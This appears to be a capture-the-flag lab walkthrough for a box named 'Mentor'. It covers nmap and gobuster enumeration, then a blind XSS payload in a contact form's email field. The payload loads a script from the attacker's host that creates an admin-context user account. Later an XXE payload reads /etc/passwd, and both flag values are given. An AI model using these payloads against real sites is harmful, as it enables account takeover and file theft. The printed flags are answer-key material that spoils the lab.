# **Mentor**

---
## **LOCAL.TXT**

## **Run Nmap to see running services**
```
sudo nmap -O -Pn 192.168.236.125
```
![nmap](images/nmap.png) 

## **Run Gobuster for directory/file enumeration**
```
gobuster dir -u 192.168.236.125 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
![gobuster_common_txt](images/gobuster_common_txt.png) 


- Discover exposed JavaScript files revealing admin functionality.


```
gobuster dir -u 192.168.236.125/dev -w /usr/share/seclists/Discovery/Web-Content/common.txt -x js -t 10
```
![gobuster_dev_folder](images/gobuster_dev_folder.png) 


```
gobuster dir -u 192.168.236.125/dev/js -w /usr/share/seclists/Discovery/Web-Content/common.txt -x js -t 10
```
![gobuster_dev_js_folder](images/gobuster_dev_js_folder.png) 

- Now access http://192.168.236.125/dev/js/main.js file.

![main.js_add_user_end_point](images/main.js_add_user_end_point.png) 

- If you read the addUser() function from main.js, we are only taking the required code with the proper values to add a new user in the context of the admin user with the endpoint /admin/users/add. Remember to pass the filtration in email field `aa@aa <script src='http://192.168.xxx.xxx/xss.js'>`

- Create a create_user.js file in our kali machine and host it on port 80.

```
var xhttp = new XMLHttpRequest();
var creds = 'email=attacker@gmail.com&password=test&name=Attacker&username=attacker';
xhttp.open("GET", "/admin/users/add?" + creds, true);
xhttp.send();
```

- Start the HTTP server.
```
python3 -m http.server 80
```
- Email field is vulnerable to blind XSS. So you can intercept the 'Contact US' form and apply payload in email parameter.
![blind_xss_payload_in_email](images/blind_xss_payload_in_email.png) 

Payload:
```
aa@aa <script src="http://192.168.45.226:80/create_user.js"></script>
```

- As you can see in our Kali logs the  createu_user.js is called which actually created a new user with username: attacker and password: test.
![create_user_js_in_logs](images/create_user_js_in_logs.png) 

- So now try to login with newly created user. 
![login_with_new_user](images/login_with_new_user.png) 

- Then you can find the local.txt flag here.
![local_txt_flag](images/local_txt_flag.png) 

### local.txt flag:  dffb66a6671cfdca89336cce4ba1d1f2

---

## **PROOF.TXT**

- The import feature in Trainers page take XML input, so we can try XXE here.
```
<?xml version="1.0"?>
<!DOCTYPE response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>
  <id>1</id>
  <name>Robin Marjan</name>
  <proffesion>Web Development</proffesion>
  <bio>&xxe;</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```

![xxe_payload_intercepted](images/xxe_payload_intercepted.png) 

![xxe_confirmation](images/xxe_confirmation.png) 

This confirms presence of XXE vulnerability.

- Now try to read the proof.txt flag.

![xxe_proof_txt_flag](images/xxe_proof_txt_flag.png) 

### proof.txt flag: 1a8ddd9c705908ef2c6f7f383bf08477 


